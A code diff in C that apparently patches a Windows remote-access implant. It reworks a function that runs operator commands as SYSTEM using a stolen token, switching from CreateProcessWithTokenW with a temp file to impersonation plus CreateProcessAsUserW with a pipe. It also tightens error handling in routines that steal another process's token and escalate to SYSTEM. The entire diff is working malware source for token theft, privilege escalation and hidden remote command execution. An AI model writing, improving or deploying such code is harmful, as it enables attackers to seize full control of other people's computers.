@@ -83,89 +83,133 @@ static char* run_shell(const char *cmd) {
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
     if (hSysTok) {
-        /* seclogon (used by CreateProcessWithTokenW) duplicates handles that are
-           explicitly listed in STARTUPINFOW.hStdOutput/hStdError into the child.
-           Create an inheritable file handle and pass it there; run the command
-           directly via "cmd.exe /c CMD" without any shell redirect in the cmdline. */
-        DWORD uid = GetCurrentProcessId() ^ GetTickCount();
-        char outFile[MAX_PATH];
-        snprintf(outFile, sizeof(outFile), "C:\\Users\\Public\\sb%08lx.out", (unsigned long)uid);
-
-        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
-        HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE,
-            FILE_SHARE_READ | FILE_SHARE_WRITE, &sa,
-            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
+        /* CreateProcessWithTokenW (seclogon) does not reliably pass inherited
+           stdout/stderr handles.  That failure mode is silent: cmd.exe exits
+           successfully, but the result body is empty and the GUI displays
+           "[done]".  Impersonate first, then CreateProcessAsUserW with
+           bInheritHandles=TRUE so the anonymous pipe is duplicated correctly. */
+        HANDLE hRead = NULL, hWrite = NULL;
+        SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
+        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
             char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: CreateFile %lu]", GetLastError());
+            snprintf(e, 96, "[error: CreatePipe %lu]", GetLastError());
+            return e;
+        }
+        if (!SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)) {
+            DWORD err = GetLastError();
+            CloseHandle(hRead); CloseHandle(hWrite);
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: SetHandleInformation %lu]", err);
             return e;
         }
 
-        char cli[4224];
-        snprintf(cli, sizeof(cli), "cmd.exe /c %s", cmd);
-        wchar_t wcli[4224];
-        MultiByteToWideChar(CP_ACP, 0, cli, -1, wcli, 4224);
+        wchar_t wcmd[4096];
+        if (MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd,
+                                (int)(sizeof(wcmd) / sizeof(wcmd[0]))) <= 0) {
+            DWORD err = GetLastError();
+            CloseHandle(hRead); CloseHandle(hWrite);
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: command encoding %lu]", err);
+            return e;
+        }
 
         STARTUPINFOW si = {0};
-        si.cb       = sizeof(si);
-        si.dwFlags  = STARTF_USESTDHANDLES;
-        si.hStdInput  = NULL;
-        si.hStdOutput = hFile;
-        si.hStdError  = hFile;
+        si.cb        = sizeof(si);
+        si.dwFlags   = STARTF_USESTDHANDLES;
+        si.hStdInput = NULL;
+        si.hStdOutput = hWrite;
+        si.hStdError  = hWrite;
         PROCESS_INFORMATION pi = {0};
+
+        if (!CreateProcessAsUserW) {
+            CloseHandle(hRead); CloseHandle(hWrite);
+            return strdup("[error: CreateProcessAsUserW unavailable]");
+        }
 
         BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
         DWORD imp_err = GetLastError();
         BOOL proc_ok = FALSE;
         DWORD proc_err = 0;
         if (imp_ok) {
-            proc_ok = CreateProcessWithTokenW(hSysTok, 0, NULL, wcli,
-                CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+            proc_ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
+                NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
             proc_err = GetLastError();
             RevertToSelf();
         }
-        CloseHandle(hFile);  /* parent closes its copy; child holds its own */
+        CloseHandle(hWrite);
 
         if (!imp_ok) {
-            DeleteFileA(outFile);
+            CloseHandle(hRead);
             char *e = (char*)malloc(96);
             snprintf(e, 96, "[error: ImpersonateLoggedOnUser %lu]", imp_err);
             return e;
         }
         if (!proc_ok) {
-            DeleteFileA(outFile);
+            CloseHandle(hRead);
             char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: CreateProcessWithTokenW %lu]", proc_err);
+            snprintf(e, 96, "[error: CreateProcessAsUserW %lu]", proc_err);
             return e;
         }
 
-        WaitForSingleObject(pi.hProcess, 60000);
-        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-
-        FILE *f = fopen(outFile, "rb");
-        if (!f) {
-            char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: no outfile err=%lu]", GetLastError());
-            return e;
-        }
         size_t cap = 4096, len = 0;
         char *buf = (char*)malloc(cap);
-        if (!buf) { fclose(f); DeleteFileA(outFile); return strdup("[oom]"); }
-        {
-            DWORD nr; char tmp[512];
-            while ((nr = (DWORD)fread(tmp, 1, sizeof(tmp), f)) > 0) {
-                if (len + nr + 1 >= cap) {
-                    cap = (len + nr) * 2 + 1024;
-                    char *nb = (char*)realloc(buf, cap);
-                    if (!nb) break;
-                    buf = nb;
-                }
-                memcpy(buf + len, tmp, nr); len += nr;
-            }
-            fclose(f);
+        if (!buf) {
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            return strdup("[oom]");
         }
+
+        /* Drain without blocking indefinitely if the command leaves a child
+           holding the write end open.  Reading concurrently also avoids the
+           anonymous-pipe buffer deadlock for commands with large output. */
+        DWORD started = GetTickCount();
+        for (;;) {
+            DWORD avail = 0, nr = 0;
+            BOOL peek_ok = PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL);
+            if (peek_ok && avail > 0) {
+                char tmp[512];
+                DWORD want = avail < sizeof(tmp) ? avail : (DWORD)sizeof(tmp);
+                if (ReadFile(hRead, tmp, want, &nr, NULL) && nr > 0) {
+                    if (len + nr + 1 >= cap) {
+                        cap = (len + nr) * 2 + 1024;
+                        char *nb = (char*)realloc(buf, cap);
+                        if (!nb) break;
+                        buf = nb;
+                    }
+                    memcpy(buf + len, tmp, nr); len += nr;
+                    continue;
+                }
+            }
+
+            DWORD exit_code = STILL_ACTIVE;
+            if (!GetExitCodeProcess(pi.hProcess, &exit_code) ||
+                exit_code != STILL_ACTIVE) {
+                /* One final drain after process termination. */
+                while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+                    char tmp[512];
+                    DWORD want = avail < sizeof(tmp) ? avail : (DWORD)sizeof(tmp);
+                    if (!ReadFile(hRead, tmp, want, &nr, NULL) || nr == 0) break;
+                    if (len + nr + 1 >= cap) {
+                        cap = (len + nr) * 2 + 1024;
+                        char *nb = (char*)realloc(buf, cap);
+                        if (!nb) break;
+                        buf = nb;
+                    }
+                    memcpy(buf + len, tmp, nr); len += nr;
+                }
+                break;
+            }
+
+            if (GetTickCount() - started >= 60000) {
+                TerminateProcess(pi.hProcess, 1);
+                break;
+            }
+            Sleep(10);
+        }
+
         buf[len] = '\0';
-        DeleteFileA(outFile);
+        CloseHandle(hRead);
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
         return buf;
     }
 
@@ -1034,7 +1078,11 @@ static char *gs_try_steal(DWORD pid, const char *name) {
     DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary,      &hPrim);
     DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);
     CloseHandle(hTok);
-    if (!hDup) { if (hPrim) CloseHandle(hPrim); return NULL; }
+    if (!hPrim || !hDup) {
+        if (hPrim) CloseHandle(hPrim);
+        if (hDup)  CloseHandle(hDup);
+        return NULL;
+    }
     if (!ImpersonateLoggedOnUser(hDup)) { CloseHandle(hDup); if (hPrim) CloseHandle(hPrim); return NULL; }
     CloseHandle(hDup);
     HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
@@ -1147,6 +1195,13 @@ static char *get_system(void) {
         if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, FALSE, &hThr)) {
             DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
             CloseHandle(hThr);
+        }
+        if (!hPrim) {
+            DWORD err = GetLastError();
+            RevertToSelf();
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[-] T1+T2 failed (DuplicateTokenEx err %lu)", err);
+            return e;
         }
         HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
         if (old) CloseHandle(old);
